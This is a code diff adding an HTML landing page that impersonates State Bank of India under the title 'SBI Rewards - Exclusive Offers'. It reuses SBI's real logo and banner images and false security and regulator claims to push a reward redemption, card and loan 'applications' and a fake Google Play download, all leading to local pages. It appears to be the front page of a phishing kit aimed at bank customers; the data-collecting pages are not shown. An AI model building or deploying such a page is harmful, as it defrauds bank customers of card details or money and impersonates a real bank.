@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>SBI Rewards - Exclusive Offers</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f7fa;
+            color: #1e293b;
+        }
+
+        /* Banner Section */
+        .banner-section {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .banner-slider {
+            display: flex;
+            transition: transform 0.5s ease;
+        }
+
+        .banner-slide {
+            min-width: 100%;
+        }
+
+        .banner-slide img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* SBI Header */
+        .sbi-header {
+            background: linear-gradient(135deg, #1A237E, #0D47A1, #CE1754);
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .sbi-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .sbi-logo img {
+            width: 85px;
+            height: 45px;
+            background: white;
+            border-radius: 10px;
+            padding: 5px;
+        }
+
+        .sbi-logo-text h2 {
+            color: white;
+            font-size: 18px;
+        }
+
+        .sbi-logo-text p {
+            color: #BBDEFB;
+            font-size: 10px;
+        }
+
+        .sbi-notify {
+            background: #CE1754;
+            color: white;
+            padding: 6px 15px;
+            border-radius: 25px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        /* Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        /* Redeem Button */
+        .redeem-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #ff9933, #ff7700);
+            color: #003366;
+            padding: 14px 35px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 153, 51, 0.3);
+        }
+
+        .redeem-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 153, 51, 0.4);
+        }
+
+        /* SBI App Download Button */
+        .sbi-app-download {
+            background: linear-gradient(135deg, #003366, #1a4c8c);
+            border-radius: 20px;
+            padding: 15px 25px;
+            margin: 20px auto;
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+
+        .sbi-app-download:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+
+        .sbi-app-download i {
+            font-size: 40px;
+            color: white;
+        }
+
+        .sbi-app-text {
+            text-align: left;
+        }
+
+        .sbi-app-text small {
+            font-size: 11px;
+            color: #BBDEFB;
+            display: block;
+        }
+
+        .sbi-app-text span {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+        }
+
+        /* Title */
+        .section-title {
+            font-size: 28px;
+            color: #003366;
+            margin: 30px 0 20px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 3px;
+            background: #ff9933;
+            border-radius: 2px;
+        }
+
+        /* Down Arrow */
+        .down-arrow {
+            text-align: center;
+            margin: 20px 0;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(10px);
+            }
+        }
+
+        .down-arrow img {
+            width: 50px;
+            opacity: 0.7;
+        }
+
+        /* Cards Grid */
+        .cards-wrapper {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 25px;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* SBI Card */
+        .sbi-card {
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            transition: all 0.3s;
+            text-align: center;
+            padding: 25px 20px;
+            position: relative;
+            border: 1px solid #e2e8f0;
+        }
+
+        .sbi-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+            border-color: #ff9933;
+        }
+
+        .card-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #003366, #1a4c8c);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+        }
+
+        .card-icon i {
+            font-size: 40px;
+            color: white;
+        }
+
+        .card-icon.credit {
+            background: linear-gradient(135deg, #00B5EF, #0099cc);
+        }
+
+        .card-icon.loan {
+            background: linear-gradient(135deg, #ff9933, #ff7700);
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #003366;
+            margin-bottom: 10px;
+        }
+
+        .card-desc {
+            font-size: 13px;
+            color: #64748b;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .apply-btn {
+            background: #003366;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .apply-btn:hover {
+            background: #ff9933;
+            color: #003366;
+        }
+
+        /* Footer */
+        .sbi-footer {
+            background: linear-gradient(135deg, #1A237E, #0D47A1, #CE1754);
+            color: #94a3b8;
+            padding: 40px 20px 25px;
+            margin-top: 40px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            color: #94a3b8;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: #ff9933;
+        }
+
+        .footer-copyright {
+            font-size: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 20px;
+            margin-top: 20px;
+        }
+
+        /* Slider Dots */
+        .slider-dots {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: -30px;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .dot.active {
+            background: #ff9933;
+            width: 25px;
+            border-radius: 10px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .cards-wrapper {
+                grid-template-columns: 1fr;
+                padding: 15px;
+            }
+
+            .section-title {
+                font-size: 24px;
+            }
+
+            .sbi-header {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .redeem-btn {
+                font-size: 16px;
+                padding: 12px 30px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 15px;
+            }
+
+            .sbi-app-download {
+                padding: 12px 20px;
+            }
+
+            .sbi-app-download i {
+                font-size: 30px;
+            }
+
+            .sbi-app-text span {
+                font-size: 14px;
+            }
+        }
+    </style>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+
+<body>
+
+    <!-- SBI Header -->
+    <div class="sbi-header">
+        <div class="sbi-logo">
+            <img src="https://sbi.bank.in/o/SBI-Theme/images/custom/logo.png" alt="SBI Logo">
+            <div class="sbi-logo-text">
+                <h2>State Bank of India</h2>
+                <p>India's Largest Bank | Since 1806</p>
+            </div>
+        </div>
+        <div class="sbi-notify">
+            <i class="fas fa-bell"></i> NOTIFY
+        </div>
+    </div>
+
+    <!-- Banner Slider -->
+    <div class="banner-section">
+        <div class="banner-slider" id="bannerSlider">
+            <div class="banner-slide">
+                <img src="https://sbi.bank.in/documents/16012/44015527/230424-SBI_MSME_Loan_Banner--1.jpg/e3910e1a-0361-07f4-9499-abf71ba3baec?t=1713876610017"
+                    alt="SBI Banner 1">
+            </div>
+            <div class="banner-slide">
+                <img src="https://sbi.bank.in/documents/16012/52964925/CoE_Banner.png/9a92be1f-fdb2-2b03-fb0f-8d43a1f605fb?t=1769777774035"
+                    alt="SBI Banner 2">
+            </div>
+            <div class="banner-slide">
+                <img src="https://sbi.bank.in/documents/16012/52964925/SBI_Centralised-Number-Series_1820x831px.jpg/e52b9318-2b43-7df7-bb50-698d50902113?t=1748850822920"
+                    alt="SBI Banner 3">
+            </div>
+        </div>
+        <div class="slider-dots" id="sliderDots"></div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <a href="option.html" class="redeem-btn">
+            <i class="fas fa-gift"></i> REDEEM NOW
+        </a>
+
+        <!-- SBI App Download Button -->
+        <div style="margin-top: 25px;">
+            <a href="app.html" class="sbi-app-download">
+                <i class="fab fa-google-play"></i>
+                <div class="sbi-app-text">
+                    <small>GET IT ON</small>
+                    <span>Google Play</span>
+                </div>
+            </a>
+        </div>
+
+        <h2 class="section-title">GET YOUR REWARD NOW</h2>
+
+        <div class="down-arrow">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='50' height='50' viewBox='0 0 24 24' fill='none' stroke='%23ff9933' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E"
+                alt="Down Arrow">
+        </div>
+    </div>
+
+    <!-- Services Cards -->
+    <div class="cards-wrapper">
+        <!-- Application Status -->
+        <div class="sbi-card">
+            <div class="card-icon">
+                <i class="fas fa-chart-line"></i>
+            </div>
+            <div class="card-title">Application Status</div>
+            <div class="card-desc">Check your credit card application status instantly</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+
+        <!-- Plan Deactivate -->
+        <div class="sbi-card">
+            <div class="card-icon">
+                <i class="fas fa-ban"></i>
+            </div>
+            <div class="card-title">Plan Deactivate</div>
+            <div class="card-desc">Deactivate your existing credit card plan</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+
+        <!-- Limit Increase -->
+        <div class="sbi-card">
+            <div class="card-icon credit">
+                <i class="fas fa-arrow-up"></i>
+            </div>
+            <div class="card-title">Limit Increase Application</div>
+            <div class="card-desc">Request for credit limit increase</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+
+        <!-- Loan Application -->
+        <div class="sbi-card">
+            <div class="card-icon loan">
+                <i class="fas fa-rupee-sign"></i>
+            </div>
+            <div class="card-title">Loan Application</div>
+            <div class="card-desc">Apply for personal loan up to ₹50 Lakhs</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+
+        <!-- New Application Form -->
+        <div class="sbi-card">
+            <div class="card-icon">
+                <i class="fas fa-file-alt"></i>
+            </div>
+            <div class="card-title">New Application Form</div>
+            <div class="card-desc">Fill new credit card application form</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+
+        <!-- Online Use Application -->
+        <div class="sbi-card">
+            <div class="card-icon credit">
+                <i class="fas fa-globe"></i>
+            </div>
+            <div class="card-title">Online Use Application</div>
+            <div class="card-desc">Enable your card for online transactions</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+    </div>
+
+    <!-- SBI Footer -->
+    <footer class="sbi-footer">
+        <div class="footer-links">
+            <a href="#">Terms & Conditions</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Contact Support</a>
+            <a href="#">Branch Locator</a>
+            <a href="#">ATM Locator</a>
+        </div>
+        <div class="footer-links">
+            <a href="#"><i class="fab fa-facebook-f"></i> Facebook</a>
+            <a href="#"><i class="fab fa-twitter"></i> Twitter</a>
+            <a href="#"><i class="fab fa-linkedin-in"></i> LinkedIn</a>
+            <a href="#"><i class="fab fa-instagram"></i> Instagram</a>
+        </div>
+        <div class="footer-copyright">
+            <p>Copyright © 2025 | Powered by <strong style="color: #ff9933;">State Bank of India</strong></p>
+            <p style="margin-top: 10px;">🔒 256-bit SSL Secure Banking | RBI Regulated Bank</p>
+        </div>
+    </footer>
+
+    <script>
+        // Banner Slider
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.banner-slide');
+        const totalSlides = slides.length;
+        const slider = document.getElementById('bannerSlider');
+        const dotsContainer = document.getElementById('sliderDots');
+
+        // Create dots
+        for (let i = 0; i < totalSlides; i++) {
+            const dot = document.createElement('div');
+            dot.classList.add('dot');
+            if (i === 0) dot.classList.add('active');
+            dot.onclick = () => goToSlide(i);
+            dotsContainer.appendChild(dot);
+        }
+
+        function goToSlide(index) {
+            currentSlide = index;
+            slider.style.transform = `translateX(-${currentSlide * 100}%)`;
+            updateDots();
+        }
+
+        function updateDots() {
+            const dots = document.querySelectorAll('.dot');
+            dots.forEach((dot, index) => {
+                dot.classList.toggle('active', index === currentSlide);
+            });
+        }
+
+        function nextSlide() {
+            currentSlide = (currentSlide + 1) % totalSlides;
+            goToSlide(currentSlide);
+        }
+
+        // Auto slide every 5 seconds
+        setInterval(nextSlide, 5000);
+
+        // Function to create or update a timestamp in local storage
+        function updateTimestamp() {
+            const currentTimestamp = Date.now();
+            if (localStorage.getItem('formId')) {
+                localStorage.setItem('formId', currentTimestamp);
+                console.log('Timestamp updated to:', currentTimestamp);
+            } else {
+                localStorage.setItem('formId', currentTimestamp);
+                console.log('Timestamp created:', currentTimestamp);
+            }
+        }
+
+        window.onload = updateTimestamp;
+    </script>
+</body>
+
+</html>
